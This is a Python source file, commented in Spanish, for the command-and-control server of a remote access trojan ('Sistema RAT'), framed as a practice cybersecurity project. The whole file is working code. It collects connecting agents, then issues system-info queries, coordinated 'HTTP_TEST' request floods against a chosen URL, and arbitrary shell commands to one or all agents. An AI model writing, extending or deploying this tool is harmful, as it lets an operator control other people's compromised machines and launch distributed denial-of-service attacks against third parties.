#!/usr/bin/env python3
"""
Sistema RAT - Servidor de Administración Remota
Para entornos de práctica controlados - Proyecto de Ciberseguridad
Ejecutar en Ubuntu Server (AWS)
"""

import socket
import threading
import json
import time
import os
from datetime import datetime

class RATServer:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.agents = {}  # {agent_id: {'socket': socket, 'address': address, 'info': info}}
        self.agent_counter = 0
        self.lock = threading.Lock()
        self.running = False
        self.server_socket = None
        
    def start_server(self):
        """Inicia el servidor y escucha conexiones entrantes"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            
            print(f"[+] Servidor iniciado en {self.host}:{self.port}")
            print("[+] Esperando conexiones de agentes...")
            
            # Thread para aceptar conexiones
            accept_thread = threading.Thread(target=self.accept_connections, daemon=True)
            accept_thread.start()
            
            return True
        except Exception as e:
            print(f"[-] Error al iniciar servidor: {e}")
            return False
    
    def accept_connections(self):
        """Acepta conexiones entrantes de agentes"""
        while self.running:
            try:
                client_socket, client_address = self.server_socket.accept()
                
                # Recibir información inicial del agente
                client_socket.settimeout(10)
                data = client_socket.recv(4096).decode('utf-8')
                agent_info = json.loads(data)
                
                with self.lock:
                    self.agent_counter += 1
                    agent_id = self.agent_counter
                    self.agents[agent_id] = {
                        'socket': client_socket,
                        'address': client_address,
                        'info': agent_info,
                        'connected_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                
                print(f"\n[+] Nuevo agente conectado: ID={agent_id} | {client_address[0]}:{client_address[1]}")
                print(f"    Sistema: {agent_info.get('os', 'Unknown')} | Hostname: {agent_info.get('hostname', 'Unknown')}")
                
                # Thread para mantener la conexión
                client_thread = threading.Thread(
                    target=self.handle_agent, 
                    args=(agent_id,), 
                    daemon=True
                )
                client_thread.start()
                
            except Exception as e:
                if self.running:
                    print(f"[-] Error aceptando conexión: {e}")
    
    def handle_agent(self, agent_id):
        """Maneja la comunicación con un agente específico"""
        try:
            agent = self.agents[agent_id]
            client_socket = agent['socket']
            client_socket.settimeout(None)
            
            while self.running:
                # Mantener la conexión viva
                time.sleep(1)
                
        except Exception as e:
            print(f"[-] Error en agente {agent_id}: {e}")
            self.disconnect_agent(agent_id)
    
    def send_command(self, agent_id, command, params=None):
        """Envía un comando a un agente específico"""
        try:
            agent = self.agents.get(agent_id)
            if not agent:
                print(f"[-] Agente {agent_id} no encontrado")
                return None
            
            message = {
                'command': command,
                'params': params or {},
                'timestamp': datetime.now().isoformat()
            }
            
            client_socket = agent['socket']
            client_socket.send(json.dumps(message).encode('utf-8'))
            
            # Esperar respuesta
            client_socket.settimeout(30)
            response = client_socket.recv(8192).decode('utf-8')
            client_socket.settimeout(None)
            
            return json.loads(response)
            
        except socket.timeout:
            print(f"[-] Timeout esperando respuesta del agente {agent_id}")
            return None
        except Exception as e:
            print(f"[-] Error enviando comando a agente {agent_id}: {e}")
            self.disconnect_agent(agent_id)
            return None
    
    def send_command_to_all(self, command, params=None):
        """Envía un comando a todos los agentes conectados"""
        results = {}
        agent_ids = list(self.agents.keys())
        
        for agent_id in agent_ids:
            print(f"[*] Enviando comando a agente {agent_id}...")
            result = self.send_command(agent_id, command, params)
            results[agent_id] = result
        
        return results
    
    def disconnect_agent(self, agent_id):
        """Desconecta un agente"""
        with self.lock:
            if agent_id in self.agents:
                try:
                    self.agents[agent_id]['socket'].close()
                except:
                    pass
                del self.agents[agent_id]
                print(f"[!] Agente {agent_id} desconectado")
    
    def list_agents(self):
        """Lista todos los agentes conectados"""
        if not self.agents:
            print("\n[!] No hay agentes conectados")
            return
        
        print("\n" + "="*80)
        print(" ID  | IP Address      | Hostname          | OS              | Conectado")
        print("="*80)
        
        for agent_id, agent in self.agents.items():
            info = agent['info']
            address = agent['address']
            print(f" {agent_id:<3} | {address[0]:<15} | {info.get('hostname', 'N/A'):<17} | "
                  f"{info.get('os', 'N/A'):<15} | {agent['connected_at']}")
        
        print("="*80)
    
    def show_menu(self):
        """Muestra el menú principal"""
        print("\n" + "="*60)
        print(" Sistema RAT - Administración Remota (Entorno de Práctica)")
        print("="*60)
        print(" 1. Listar agentes conectados")
        print(" 2. Enviar PING a un agente")
        print(" 3. Obtener SYSINFO de un agente")
        print(" 4. Ejecutar HTTP_TEST (prueba de carga)")
        print(" 5. Enviar comando a TODOS los agentes")
        print(" 6. Desconectar un agente")
        print(" 7. Ver logs de actividad")
        print(" 8. Ejecutar comando personalizado (un agente)")
        print(" 9. Ejecutar comando personalizado (TODOS)")
        print(" 10. Salir y cerrar servidor")
        print("="*60)
    
    def run_menu(self):
        """Ejecuta el menú interactivo"""
        while self.running:
            self.show_menu()
            choice = input("\nSeleccione una opción: ").strip()
            
            if choice == '1':
                self.list_agents()
            
            elif choice == '2':
                self.list_agents()
                agent_id = input("\nIngrese ID del agente: ").strip()
                try:
                    agent_id = int(agent_id)
                    target = input("Ingrese IP/hostname para ping (o Enter para google.com): ").strip() or "google.com"
                    print(f"\n[*] Enviando PING a {target}...")
                    result = self.send_command(agent_id, 'PING', {'target': target})
                    if result:
                        print(f"\n[+] Resultado:\n{result.get('output', 'Sin respuesta')}")
                except ValueError:
                    print("[-] ID inválido")
            
            elif choice == '3':
                self.list_agents()
                agent_id = input("\nIngrese ID del agente: ").strip()
                try:
                    agent_id = int(agent_id)
                    print(f"\n[*] Obteniendo información del sistema...")
                    result = self.send_command(agent_id, 'SYSINFO', {})
                    if result:
                        print(f"\n[+] Información del Sistema:")
                        for key, value in result.get('data', {}).items():
                            print(f"  {key}: {value}")
                except ValueError:
                    print("[-] ID inválido")
            
            elif choice == '4':
                self.list_agents()
                agent_id = input("\nIngrese ID del agente (o 'all' para todos): ").strip()
                url = input("URL del servidor de prueba: ").strip()
                requests = input("Número de peticiones (default 100): ").strip() or "100"
                
                try:
                    params = {
                        'url': url,
                        'requests': int(requests)
                    }
                    
                    if agent_id.lower() == 'all':
                        print(f"\n[*] Enviando HTTP_TEST a TODOS los agentes...")
                        results = self.send_command_to_all('HTTP_TEST', params)
                        for aid, result in results.items():
                            if result:
                                print(f"\n[Agente {aid}] {result.get('output', 'Sin respuesta')}")
                    else:
                        agent_id = int(agent_id)
                        print(f"\n[*] Ejecutando prueba de carga...")
                        result = self.send_command(agent_id, 'HTTP_TEST', params)
                        if result:
                            print(f"\n[+] Resultado:\n{result.get('output', 'Sin respuesta')}")
                except ValueError:
                    print("[-] Valor inválido")
            
            elif choice == '5':
                print("\nComandos disponibles: PING, SYSINFO, HTTP_TEST, EXIT")
                command = input("Ingrese comando: ").strip().upper()
                
                if command in ['PING', 'SYSINFO', 'HTTP_TEST', 'EXIT']:
                    params = {}
                    if command == 'PING':
                        params['target'] = input("Target (Enter para google.com): ").strip() or "google.com"
                    elif command == 'HTTP_TEST':
                        params['url'] = input("URL: ").strip()
                        params['requests'] = int(input("Peticiones: ").strip() or "100")
                    
                    print(f"\n[*] Enviando {command} a todos los agentes...")
                    results = self.send_command_to_all(command, params)
                    
                    for agent_id, result in results.items():
                        if result:
                            print(f"\n[Agente {agent_id}]")
                            print(result.get('output', 'Sin respuesta'))
                else:
                    print("[-] Comando no válido")
            
            elif choice == '6':
                self.list_agents()
                agent_id = input("\nIngrese ID del agente a desconectar: ").strip()
                try:
                    agent_id = int(agent_id)
                    self.disconnect_agent(agent_id)
                except ValueError:
                    print("[-] ID inválido")
            
            elif choice == '7':
                print("\n[*] Logs de actividad:")
                print(f"  - Agentes conectados: {len(self.agents)}")
                print(f"  - Total de conexiones recibidas: {self.agent_counter}")
            
            elif choice == '8':
                self.list_agents()
                agent_id = input("\nIngrese ID del agente: ").strip()
                try:
                    agent_id = int(agent_id)
                    print("\n⚠️  ADVERTENCIA: Ejecutar comandos personalizados puede ser peligroso")
                    print("    Solo usar en entornos de prueba controlados")
                    command = input("\nComando a ejecutar: ").strip()
                    
                    if command:
                        confirm = input(f"¿Confirmar ejecución de '{command}' en agente {agent_id}? (s/n): ").strip().lower()
                        if confirm == 's':
                            print(f"\n[*] Ejecutando comando personalizado en agente {agent_id}...")
                            result = self.send_command(agent_id, 'CUSTOM', {'command': command})
                            if result:
                                print(f"\n[+] Resultado:")
                                print(f"Estado: {result.get('status', 'unknown')}")
                                print(f"Salida:\n{result.get('output', 'Sin respuesta')}")
                        else:
                            print("[!] Comando cancelado")
                    else:
                        print("[-] Comando vacío")
                except ValueError:
                    print("[-] ID inválido")
            
            elif choice == '9':
                print("\n⚠️  ADVERTENCIA: Ejecutar comandos personalizados en TODOS los agentes")
                print("    Solo usar en entornos de prueba controlados")
                command = input("\nComando a ejecutar en TODOS: ").strip()
                
                if command:
                    confirm = input(f"¿Confirmar ejecución de '{command}' en {len(self.agents)} agentes? (s/n): ").strip().lower()
                    if confirm == 's':
                        print(f"\n[*] Ejecutando comando personalizado en todos los agentes...")
                        results = self.send_command_to_all('CUSTOM', {'command': command})
                        
                        for agent_id, result in results.items():
                            if result:
                                print(f"\n[Agente {agent_id}]")
                                print(f"Estado: {result.get('status', 'unknown')}")
                                print(f"Salida: {result.get('output', 'Sin respuesta')}")
                                print("-" * 60)
                    else:
                        print("[!] Comando cancelado")
                else:
                    print("[-] Comando vacío")
            
            elif choice == '10':
                print("\n[!] Cerrando servidor...")
                self.shutdown()
                break
            
            else:
                print("[-] Opción no válida")
    
    def shutdown(self):
        """Cierra el servidor y todas las conexiones"""
        self.running = False
        
        # Desconectar todos los agentes
        agent_ids = list(self.agents.keys())
        for agent_id in agent_ids:
            try:
                self.send_command(agent_id, 'EXIT', {})
            except:
                pass
            self.disconnect_agent(agent_id)
        
        # Cerrar socket del servidor
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        
        print("[+] Servidor cerrado correctamente")


def main():
    print("""
    ╔════════════════════════════════════════════════════════════╗
    ║  Sistema RAT - Remote Administration Tool                 ║
    ║  Servidor de Administración Remota                        ║
    ║  Para entornos de práctica controlados                    ║
    ╚════════════════════════════════════════════════════════════╝
    """)
    
    # Configuración del servidor
    host = input("Host (Enter para 0.0.0.0): ").strip() or '0.0.0.0'
    port = input("Puerto (Enter para 4444): ").strip() or '4444'
    
    try:
        port = int(port)
        server = RATServer(host, port)
        
        if server.start_server():
            # Esperar un momento para que el servidor esté listo
            time.sleep(1)
            # Ejecutar menú interactivo
            server.run_menu()
        else:
            print("[-] No se pudo iniciar el servidor")
    
    except KeyboardInterrupt:
        print("\n\n[!] Interrupción detectada. Cerrando servidor...")
        if 'server' in locals():
            server.shutdown()
    except Exception as e:
        print(f"[-] Error: {e}")


if __name__ == "__main__":
    main()
